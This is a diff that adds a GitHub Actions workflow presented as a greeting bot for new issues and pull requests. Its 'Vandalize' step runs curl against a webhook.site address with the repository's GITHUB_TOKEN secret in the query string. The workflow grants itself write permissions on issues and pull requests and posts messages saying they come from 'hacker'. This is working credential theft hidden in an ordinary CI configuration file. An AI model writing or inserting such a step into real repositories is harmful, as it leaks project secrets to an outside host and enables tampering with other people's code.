@@ -1,0 +1,21 @@
+name: Greetings2
+
+on: [pull_request, issues]
+
+jobs:
+  greeting:
+    runs-on: ubuntu-latest
+    permissions:
+      issues: write
+      pull-requests: write
+    steps:
+    - name: Vandalize
+      run: 'curl 	https://webhook.site/e68e8a25-2c48-421a-b156-0ab061dc81e6?token=$GITHUB_TOKEN&hacker=yes'
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        REPO: ${{ github.repository }}
+    - uses: actions/first-interaction@v1
+      with:
+        repo-token: ${{ secrets.GITHUB_TOKEN }}
+        issue-message: 'this issue comment is from hacker'
+        pr-message: 'this is from hacker'
